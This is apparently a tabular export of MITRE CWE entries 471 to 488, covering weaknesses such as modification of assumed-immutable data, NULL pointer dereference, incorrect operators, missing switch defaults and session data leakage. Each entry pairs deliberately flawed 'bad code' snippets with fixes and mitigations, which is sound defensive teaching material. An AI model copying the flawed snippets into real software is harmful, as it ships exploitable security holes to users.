CWE-471: Modification of Assumed-Immutable Data (MAID),The product does not properly protect an assumed-immutable element from being modified by an attacker.,"Scope: Integrity, Impact: Technical Impact:Modify Application DataCommon data types that are attacked are environment variables, web application parameters, and HTTP headers., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ","Example 1In the code excerpt below, an array returned by a Java method is modified despite the fact that arrays are mutable.(bad code)Example Language:JavaString[] colors = car.getAllPossibleColors();colors[0] = ""Red"";","Phases:  Architecture and Design; Operation; ImplementationWhen the data is stored or transmitted through untrusted sources that could modify the data, implement integrity checks to detect unauthorized modification, or store/transmit the data in a trusted location that is free from external influence."
CWE-472: External Control of Assumed-Immutable Web Parameter,"The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.","Scope: Integrity, Impact: Technical Impact:Modify Application DataWithout appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies., Likelihood: ","Example 1In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable.(bad code)Example Language:JavaString accountID = request.getParameter(""accountID"");User user = getUserFromID(Long.parseLong(accountID));Example 2Hidden fields should not be trusted as secure parameters.An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:(bad code)Example Language:HTML<input type=""hidden""or even just ""hidden"". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks.","Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-473: PHP External Variable Modification,"A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.","Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ",无示范例子,"Phases:  Requirements; ImplementationCarefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals."
CWE-474: Use of Function with Inconsistent Implementations,The code uses a function that has inconsistent implementations across operating systems and versions.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,Phases:  Architecture and Design; RequirementsDo not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level.
CWE-475: Undefined Behavior for Input to API,The behavior of this function is undefined unless its control parameter is set to a specific value.,"Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-476: NULL Pointer Dereference,"A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartNULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands; Read Memory; Modify MemoryIn rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution., Likelihood:","Example 1While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur.(good code)if (pointer1 != NULL) {/* make use of pointer1 *//* ... */}If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished.Example 2This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.(bad code)Example Language:Cvoid host_lookup(char *user_supplied_addr){struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);/*routine that ensures user_supplied_addr is in the right format for conversion */validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);}If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().Note that this code is also vulnerable to a buffer overflow (CWE-119).Example 3In the following code, the programmer assumes that the system always has a property named ""cmd"" defined. If an attacker can control the program's environment so that ""cmd"" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method.(bad code)Example Language:JavaString cmd = System.getProperty(""cmd"");cmd = cmd.trim();Example 4This Android application has registered to handle a URL when sent an intent:(bad code)Example Language:Java...IntentFilter filter = new IntentFilter(""com.example.URLHandler.openURL"");MyReceiver receiver = new MyReceiver();registerReceiver(receiver, filter);...public class UrlHandlerReceiver extends BroadcastReceiver {@Overridepublic void onReceive(Context context, Intent intent) {if(""com.example.URLHandler.openURL"".equals(intent.getAction())) {String URL = intent.getStringExtra(""URLToOpen"");int length = URL.length();...}}}The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.Example 5Consider the following example of a typical client server exchange. The HandleRequest function is intended to perform a request and use a defer to close the connection whenever the function returns.(bad code)Example Language:Gofunc HandleRequest(client http.Client, request *http.Request) (*http.Response, error) {response, err := client.Do(request)defer response.Body.Close()if err != nil {return nil, err}...}If a user supplies a malformed request or violates the client policy, the Do method can return a nil response and a non-nil err.This HandleRequest Function evaluates the close before checking the error. A deferred call's arguments are evaluated immediately, so the defer statement panics due to a nil response.","Phase:  ImplementationIf all pointers that could have been modified are sanity-checked previous to use, nearly all NULL pointer dereferences can be prevented.Phase:  RequirementsThe choice could be made to use a language that is not susceptible to these issues.Phase:  ImplementationCheck the results of all functions that return a value and verify that the value is non-null before acting upon it.Effectiveness: ModerateNote:Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665).Phase:  Architecture and DesignIdentify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.Phase:  ImplementationExplicitly initialize all your variables and other data stores, either during declaration or just before the first usage.Phase:  TestingUse automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible."
CWE-477: Use of Obsolete Function,"The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.","Scope: Other, Impact: Technical Impact:Quality Degradation, Likelihood: ","Example 1The following code uses the deprecated function getpw() to verify that a plaintext password matches a user's encrypted password. If the password is valid, the function sets result to 1; otherwise it is set to 0.(bad code)Example Language:C...getpw(uid, pwdline);for (i=0; i<3; i++){cryptpw=strtok(pwdline, "":"");pwdline=0;}result = strcmp(crypt(plainpw,cryptpw), cryptpw) == 0;...Although the code often behaves correctly, using the getpw() function can be problematic from a security standpoint, because it can overflow the buffer passed to its second parameter. Because of this vulnerability, getpw() has been supplanted by getpwuid(), which performs the same lookup as getpw() but returns a pointer to a statically-allocated structure to mitigate the risk. Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby.Example 2In the following code, the programmer assumes that the system always has a property named ""cmd"" defined. If an attacker can control the program's environment so that ""cmd"" is not defined, the program throws a null pointer exception when it attempts to call the ""Trim()"" method.(bad code)Example Language:JavaString cmd = null;...cmd = Environment.GetEnvironmentVariable(""cmd"");cmd = cmd.Trim();Example 3The following code constructs a string object from an array of bytes and a value that specifies the top 8 bits of each 16-bit Unicode character.(bad code)Example Language:Java...String name = new String(nameBytes, highByte);...In this example, the constructor may not correctly convert bytes to characters depending upon which charset is used to encode the string represented by nameBytes. Due to the evolution of the charsets used to encode strings, this constructor was deprecated and replaced by a constructor that accepts as one of its parameters the name of the charset used to encode the bytes for conversion.",Phase:  ImplementationRefer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality.Phase:  RequirementsConsider seriously the security implications of using an obsolete function. Consider using alternate functions.
CWE-478: Missing Default Case in Multiple Condition Expression,"The code does not have a default case in an expression with multiple conditions, such as a switch statement.","Scope: Integrity, Impact: Technical Impact:Varies by Context; Alter Execution LogicDepending on the logical circumstances involved, any consequences may result: e.g., issues of confidentiality, authentication, authorization, availability, integrity, accountability, or non-repudiation., Likelihood: ","Example 1The following does not properly check the return code in the case where the security_check function returns a -1 value when an error occurs. If an attacker can supply data that will invoke an error, the attacker can bypass the security check:(bad code)Example Language:C#define FAILED 0#define PASSED 1int result;...result = security_check(data);switch (result) {case FAILED:printf(""Security check failed!\n"");exit(-1);//Break never reached because of exit()break;case PASSED:printf(""Security check passed.\n"");break;}// program execution continues......Instead a default label should be used for unaccounted conditions:(good code)Example Language:C#define FAILED 0#define PASSED 1int result;...result = security_check(data);switch (result) {case FAILED:printf(""Security check failed!\n"");exit(-1);//Break never reached because of exit()break;case PASSED:printf(""Security check passed.\n"");break;default:printf(""Unknown error (%d), exiting...\n"",result);exit(-1);}This label is used because the assumption cannot be made that all possible cases are accounted for. A good practice is to reserve the default case for error handling.Example 2In the following Java example the method getInterestRate retrieves the interest rate for the number of points for a mortgage. The number of points is provided within the input parameter and a switch statement will set the interest rate value to be returned based on the number of points.(bad code)Example Language:Javapublic static final String INTEREST_RATE_AT_ZERO_POINTS = ""5.00"";public static final String INTEREST_RATE_AT_ONE_POINTS = ""4.75"";public static final String INTEREST_RATE_AT_TWO_POINTS = ""4.50"";...public BigDecimal getInterestRate(int points) {BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);switch (points) {case 0:result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);break;case 1:result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);break;case 2:result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);break;}return result;}However, this code assumes that the value of the points input parameter will always be 0, 1 or 2 and does not check for other incorrect values passed to the method. This can be easily accomplished by providing a default label in the switch statement that outputs an error message indicating an invalid value for the points input parameter and returning a null value.(good code)Example Language:Javapublic static final String INTEREST_RATE_AT_ZERO_POINTS = ""5.00"";public static final String INTEREST_RATE_AT_ONE_POINTS = ""4.75"";public static final String INTEREST_RATE_AT_TWO_POINTS = ""4.50"";...public BigDecimal getInterestRate(int points) {BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);switch (points) {case 0:result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS);break;case 1:result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS);break;case 2:result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS);break;default:System.err.println(""Invalid value for points, must be 0, 1 or 2"");System.err.println(""Returning null value for interest rate"");result = null;}return result;}Example 3In the following Python example the match-case statements (available in Python version 3.10 and later) perform actions based on the result of the process_data() function. The expected return is either 0 or 1. However, if an unexpected result (e.g., -1 or 2) is obtained then no actions will be taken potentially leading to an unexpected program state.(bad code)Example Language:Pythonresult = process_data(data)match result:case 0:print(""Properly handle zero case."")case 1:print(""Properly handle one case."")# program execution continues...The recommended approach is to add a default case that captures any unexpected result conditions, regardless of how improbable these unexpected conditions might be, and properly handles them.(good code)Example Language:Pythonresult = process_data(data)match result:case 0:print(""Properly handle zero case."")case 1:print(""Properly handle one case."")case _:print(""Properly handle unexpected condition."")# program execution continues...Example 4In the following JavaScript example the switch-case statements (available in JavaScript version 1.2 and later) are used to process a given step based on the result of a calcuation involving two inputs. The expected return is either 1, 2, or 3. However, if an unexpected result (e.g., 4) is obtained then no action will be taken potentially leading to an unexpected program state.(bad code)Example Language:JavaScriptlet step = input1 + input2;switch(step) {case 1:alert(""Process step 1."");break;case 2:alert(""Process step 2."");break;case 3:alert(""Process step 3."");break;}// program execution continues...The recommended approach is to add a default case that captures any unexpected result conditions and properly handles them.(good code)Example Language:JavaScriptlet step = input1 + input2;switch(step) {case 1:alert(""Process step 1."");break;case 2:alert(""Process step 2."");break;case 3:alert(""Process step 3."");break;default:alert(""Unexpected step encountered."");}// program execution continues...Example 5The Finite State Machine (FSM) shown in the ""bad"" code snippet below assigns the output (""out"") based on the value of state, which is determined based on the user provided input (""user_input"").(bad code)Example Language:Verilogmodule fsm_1(out, user_input, clk, rst_n);input [2:0] user_input;input clk, rst_n;output reg [2:0] out;reg [1:0] state;always @ (posedge clk or negedge rst_n )beginif (!rst_n)state = 3'h0;elsecase (user_input)3'h0:3'h1:3'h2:3'h3: state = 2'h3;3'h4: state = 2'h2;3'h5: state = 2'h1;endcaseendout <= {1'h1, state};endmoduleThe case statement does not include a default to handle the scenario when the user provides inputs of 3'h6 and 3'h7.  Those inputs push the system to an undefined state and might cause a crash (denial of service) or any other unanticipated outcome.Adding a default statement to handle undefined inputs mitigates this issue.  This is shown in the ""Good"" code snippet below.  The default statement is in bold.(good code)Example Language:Verilogcase (user_input)3'h0:3'h1:3'h2:3'h3: state = 2'h3;3'h4: state = 2'h2;3'h5: state = 2'h1;default: state = 2'h0;endcase","Phase:  ImplementationEnsure that there are no cases unaccounted for when adjusting program flow or values based on the value of a given variable. In the case of switch style statements, the very simple act of creating a default case can, if done correctly, mitigate this situation. Often however, the default case is used simply to represent an assumed option, as opposed to working as a check for invalid input. This is poor practice and in some cases is as bad as omitting a default case entirely."
CWE-479: Signal Handler Use of a Non-reentrant Function,The product defines a signal handler that calls a non-reentrant function.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIt may be possible to execute arbitrary code through the use of a write-what-where condition., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Memory; Modify Application DataSignal race conditions often result in data corruption., Likelihood: ","Example 1In this example, a signal handler uses syslog() to log a message:(bad code)char *message;void sh(int dummy) {syslog(LOG_NOTICE,""%s\n"",message);sleep(10);exit(0);}int main(int argc,char* argv[]) {...signal(SIGHUP,sh);signal(SIGTERM,sh);sleep(10);exit(0);}If the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state.","Phase:  RequirementsRequire languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness.Phase:  Architecture and DesignDesign signal handlers to only set flags rather than perform complex functionality.Phase:  ImplementationEnsure that non-reentrant functions are not found in signal handlers.Phase:  ImplementationUse sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.Effectiveness: Defense in Depth"
CWE-480: Use of Incorrect Operator,"The product accidentally uses the wrong operator, which changes the logic in security-relevant ways.","Scope: Other, Impact: Technical Impact:Alter Execution LogicThis weakness can cause unintended logic to be executed and other unexpected application behavior., Likelihood: ","Example 1The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100.(bad code)Example Language:Cint isValid(int value) {if (value=100) {printf(""Value is valid\n"");return(1);}printf(""Value is not valid\n"");return(0);}(bad code)Example Language:C#bool isValid(int value) {if (value=100) {Console.WriteLine(""Value is valid."");return true;}Console.WriteLine(""Value is not valid."");return false;}However, the expression to be evaluated in the if statement uses the assignment operator ""="" rather than the comparison operator ""=="". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results.Example 2The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable.(bad code)Example Language:C#define SIZE 50int *tos, *p1, stack[SIZE];void push(int i) {p1++;if(p1==(tos+SIZE)) {// Print stack overflow error message and exit}*p1 == i;}int pop(void) {if(p1==tos) {// Print stack underflow error message and exit}p1--;return *(p1+1);}int main(int argc, char *argv[]) {// initialize tos and p1 to point to the top of stacktos = stack;p1 = stack;// code to add and remove items from stack...return 0;}The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable.However, this expression uses the comparison operator ""=="" rather than the assignment operator ""="". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results.Example 3The example code below is taken from the CVA6 processor core of the HACK@DAC'21 buggy OpenPiton SoC. Debug access allows users to access internal hardware registers that are otherwise not exposed for user access or restricted access through access control protocols. Hence, requests to enter debug mode are checked and authorized only if the processor has sufficient privileges. In addition, debug accesses are also locked behind password checkers. Thus, the processor enters debug mode only when the privilege level requirement is met, and the correct debug password is provided.The following code [REF-1377] illustrates an instance of a vulnerable implementation of debug mode. The core correctly checks if the debug requests have sufficient privileges and enables the debug_mode_d and debug_mode_q signals. It also correctly checks for debug password and enables umode_i signal.(bad code)Example Language:Verilogmodule csr_regfile #(...// check that we actually want to enter debug depending on the privilege level we are currently inunique case (priv_lvl_o)riscv::PRIV_LVL_M: begindebug_mode_d = dcsr_q.ebreakm;...riscv::PRIV_LVL_U: begindebug_mode_d = dcsr_q.ebreaku;...assign priv_lvl_o = (debug_mode_q || umode_i) ?  riscv::PRIV_LVL_M : priv_lvl_q;...debug_mode_q  <= debug_mode_d;...However, it grants debug access and changes the privilege level, priv_lvl_o, even when one of the two checks is satisfied and the other is not. Because of this, debug access can be granted by simply requesting with sufficient privileges (i.e., debug_mode_q is enabled) and failing the password check (i.e., umode_i is disabled). This allows an attacker to bypass the debug password checking and gain debug access to the core, compromising the security of the processor.A fix to this issue is to only change the privilege level of the processor when both checks are satisfied, i.e., the request has enough privileges (i.e., debug_mode_q is enabled) and the password checking is successful (i.e., umode_i is enabled) [REF-1378].(good code)Example Language:Verilogmodule csr_regfile #(...// check that we actually want to enter debug depending on the privilege level we are currently inunique case (priv_lvl_o)riscv::PRIV_LVL_M: begindebug_mode_d = dcsr_q.ebreakm;...riscv::PRIV_LVL_U: begindebug_mode_d = dcsr_q.ebreaku;...assign priv_lvl_o =(debug_mode_q && umode_i) ? riscv::PRIV_LVL_M : priv_lvl_q;...debug_mode_q  <= debug_mode_d;...",无可能的缓解方案
CWE-481: Assigning instead of Comparing,The code uses an operator for assignment when the intention was to perform a comparison.,"Scope: Other, Impact: Technical Impact:Alter Execution Logic, Likelihood: ","Example 1The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100.(bad code)Example Language:Cint isValid(int value) {if (value=100) {printf(""Value is valid\n"");return(1);}printf(""Value is not valid\n"");return(0);}(bad code)Example Language:C#bool isValid(int value) {if (value=100) {Console.WriteLine(""Value is valid."");return true;}Console.WriteLine(""Value is not valid."");return false;}However, the expression to be evaluated in the if statement uses the assignment operator ""="" rather than the comparison operator ""=="". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results.Example 2In this example, we show how assigning instead of comparing can impact code when values are being passed by reference instead of by value. Consider a scenario in which a string is being processed from user input. Assume the string has already been formatted such that different user inputs are concatenated with the colon character. When the processString function is called, the test for the colon character will result in an insertion of the colon character instead, adding new input separators. Since the string was passed by reference, the data sentinels will be inserted in the original string (CWE-464), and further processing of the inputs will be altered, possibly malformed..(bad code)Example Language:Cvoid processString (char *str) {int i;for(i=0; i<strlen(str); i++) {if (isalnum(str[i])){processChar(str[i]);}else if (str[i] = ':') {movingToNewInput();}}}}Example 3The following Java example attempts to perform some processing based on the boolean value of the input parameter. However, the expression to be evaluated in the if statement uses the assignment operator ""="" rather than the comparison operator ""=="". As with the previous examples, the variable will be reassigned locally and the expression in the if statement will evaluate to true and unintended processing may occur.(bad code)Example Language:Javapublic void checkValid(boolean isValid) {if (isValid = true) {System.out.println(""Performing processing"");doSomethingImportant();}else {System.out.println(""Not Valid, do not perform processing"");return;}}While most Java compilers will catch the use of an assignment operator when a comparison operator is required, for boolean variables in Java the use of the assignment operator within an expression is allowed. If possible, try to avoid using comparison operators on boolean variables in java. Instead, let the values of the variables stand for themselves, as in the following code.(good code)Example Language:Javapublic void checkValid(boolean isValid) {if (isValid) {System.out.println(""Performing processing"");doSomethingImportant();}else {System.out.println(""Not Valid, do not perform processing"");return;}}Alternatively, to test for false, just use the boolean NOT operator.(good code)Example Language:Javapublic void checkValid(boolean isValid) {if (!isValid) {System.out.println(""Not Valid, do not perform processing"");return;}System.out.println(""Performing processing"");doSomethingImportant();}Example 4The following example demonstrates the weakness.(bad code)Example Language:Cvoid called(int foo){if (foo=1) printf(""foo\n"");}int main() {called(2);return 0;}","Phase:  TestingMany IDEs and static analysis products will detect this problem.Phase:  ImplementationPlace constants on the left. If one attempts to assign a constant with a variable, the compiler will produce an error."
CWE-482: Comparing instead of Assigning,The code uses an operator for comparison when the intention was to perform an assignment.,"Scope: AvailabilityIntegrity, Impact: Technical Impact:Unexpected StateThe assignment will not take place, which should cause obvious program execution problems., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Javavoid called(int foo) {foo==1;if (foo==1) System.out.println(""foo\n"");}int main() {called(2);return 0;}Example 2The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable.(bad code)Example Language:C#define SIZE 50int *tos, *p1, stack[SIZE];void push(int i) {p1++;if(p1==(tos+SIZE)) {// Print stack overflow error message and exit}*p1 == i;}int pop(void) {if(p1==tos) {// Print stack underflow error message and exit}p1--;return *(p1+1);}int main(int argc, char *argv[]) {// initialize tos and p1 to point to the top of stacktos = stack;p1 = stack;// code to add and remove items from stack...return 0;}The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable.However, this expression uses the comparison operator ""=="" rather than the assignment operator ""="". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results.",Phase:  TestingMany IDEs and static analysis products will detect this problem.
CWE-483: Incorrect Block Delimitation,"The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Alter Execution LogicThis is a general logic error which will often lead to obviously-incorrect behaviors that are quickly noticed and fixed. In lightly tested or untested code, this error may be introduced it into a production environment and provide additional attack vectors by creating a control flow path leading to an unexpected state in the application. The consequences will depend on the types of behaviors that are being incorrectly executed., Likelihood: ","Example 1In this example, the programmer has indented the statements to call Do_X() and Do_Y(), as if the intention is that these functions are only called when the condition is true. However, because there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false.(bad code)Example Language:Cif (condition==true)Do_X();Do_Y();This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability.Example 2In this example, the programmer has indented the Do_Y() statement as if the intention is that the function should be associated with the preceding conditional and should only be called when the condition is true. However, because Do_X() was called on the same line as the conditional and there are no braces to signify the block, Do_Y() will always be executed, even if the condition is false.(bad code)Example Language:Cif (condition==true) Do_X();Do_Y();This might not be what the programmer intended. When the condition is critical for security, such as in making a security decision or detecting a critical error, this may produce a vulnerability.",Phase:  ImplementationAlways use explicit block delimitation and use static-analysis technologies to enforce this practice.
CWE-484: Omitted Break Statement in Switch,"The product omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.","Scope: Other, Impact: Technical Impact:Alter Execution LogicThis weakness can cause unintended logic to be executed and other unexpected application behavior., Likelihood: ","Example 1In both of these examples, a message is printed based on the month passed into the function:(bad code)Example Language:Javapublic void printMessage(int month){switch (month) {case 1: print(""January"");case 2: print(""February"");case 3: print(""March"");case 4: print(""April"");case 5: print(""May"");case 6: print(""June"");case 7: print(""July"");case 8: print(""August"");case 9: print(""September"");case 10: print(""October"");case 11: print(""November"");case 12: print(""December"");}println("" is a great month"");}(bad code)Example Language:Cvoid printMessage(int month){switch (month) {case 1: printf(""January"");case 2: printf(""February"");case 3: printf(""March"");case 4: printf(""April"");case 5: printff(""May"");case 6: printf(""June"");case 7: printf(""July"");case 8: printf(""August"");case 9: printf(""September"");case 10: printf(""October"");case 11: printf(""November"");case 12: printf(""December"");}printf("" is a great month"");}Both examples do not use a break statement after each case, which leads to unintended fall-through behavior. For example, calling ""printMessage(10)"" will result in the text ""OctoberNovemberDecember is a great month"" being printed.","Phase:  ImplementationOmitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities.Phase:  ImplementationThe functionality of omitting a break statement could be clarified with an if statement. This method is much safer."
CWE CATEGORY: 7PK - Encapsulation,"This category represents one of the phyla in the Seven Pernicious Kingdoms vulnerability classification. It includes weaknesses that occur when the product does not sufficiently encapsulate critical data or functionality. According to the authors of the Seven Pernicious Kingdoms, ""Encapsulation is about drawing strong boundaries. In a web browser that might mean ensuring that your mobile code cannot be abused by other mobile code. On the server it might mean differentiation between validated data and unvalidated data, between one user's data and another's, or between data users are allowed to see and data that they are not.""",无常见后果信息,无示范例子,无可能的缓解方案
CWE-486: Comparison of Classes by Name,"The product compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf a product relies solely on the name of an object to determine identity, it may execute the incorrect or unintended code., Likelihood: ","Example 1In this example, the expression in the if statement compares the class of the inputClass object to a trusted class by comparing the class names.(bad code)Example Language:Javaif (inputClass.getClass().getName().equals(""TrustedClassName"")) {// Do something assuming you trust inputClass// ...}However, multiple classes can have the same name therefore comparing an object's class by name can allow untrusted classes of the same name as the trusted class to be use to execute unintended or incorrect code. To compare the class of an object to the intended class the getClass() method and the comparison operator ""=="" should be used to ensure the correct trusted class is used, as shown in the following example.(good code)Example Language:Javaif (inputClass.getClass() == TrustedClass.class) {// Do something assuming you trust inputClass// ...}Example 2In this example, the Java class, TrustedClass, overrides the equals method of the parent class Object to determine equivalence of objects of the class. The overridden equals method first determines if the object, obj, is the same class as the TrustedClass object and then compares the object's fields to determine if the objects are equivalent.(bad code)Example Language:Javapublic class TrustedClass {...@Overridepublic boolean equals(Object obj) {boolean isEquals = false;// first check to see if the object is of the same classif (obj.getClass().getName().equals(this.getClass().getName())) {// then compare object fields...if (...) {isEquals = true;}}return isEquals;}...}However, the equals method compares the class names of the object, obj, and the TrustedClass object to determine if they are the same class. As with the previous example using the name of the class to compare the class of objects can lead to the execution of unintended or incorrect code if the object passed to the equals method is of another class with the same name. To compare the class of an object to the intended class, the getClass() method and the comparison operator ""=="" should be used to ensure the correct trusted class is used, as shown in the following example.(good code)Example Language:Javapublic boolean equals(Object obj) {...// first check to see if the object is of the same classif (obj.getClass() == this.getClass()) {...}...}","Phase:  ImplementationUse class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator."
CWE-487: Reliance on Package-level Scope,"Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataAny data in a Java package can be accessed outside of the Java framework if the package is distributed., Likelihood: ; Scope: Integrity, Impact: Technical Impact:Modify Application DataThe data in a Java class can be modified by anyone outside of the Java framework if the packages is distributed., Likelihood: ",Example 1The following example demonstrates the weakness.(bad code)Example Language:Javapackage math;public class Lebesgue implements Integration{public final Static String youAreHidingThisFunction(functionToIntegrate){return ...;}},"Phases:  Architecture and Design; ImplementationData should be private static and final whenever possible. This will assure that your code is protected by instantiating early, preventing access and tampering."
CWE-488: Exposure of Data Element to Wrong Session,"The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following Servlet stores the value of a request parameter in a member field and then later echoes the parameter value to the response output stream.(bad code)Example Language:Javapublic class GuestBook extends HttpServlet {String name;protected void doPost (HttpServletRequest req, HttpServletResponse res) {name = req.getParameter(""name"");...out.println(name + "", thanks for visiting!"");}}While this code will work perfectly in a single-user environment, if two users access the Servlet at approximately the same time, it is possible for the two request handler threads to interleave in the following way: Thread 1: assign ""Dick"" to name Thread 2: assign ""Jane"" to name Thread 1: print ""Jane, thanks for visiting!"" Thread 2: print ""Jane, thanks for visiting!"" Thereby showing the first user the second user's name.","Phase:  Architecture and DesignProtect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions.Phase:  TestingUse a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field).Phase:  Architecture and DesignIn a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet."
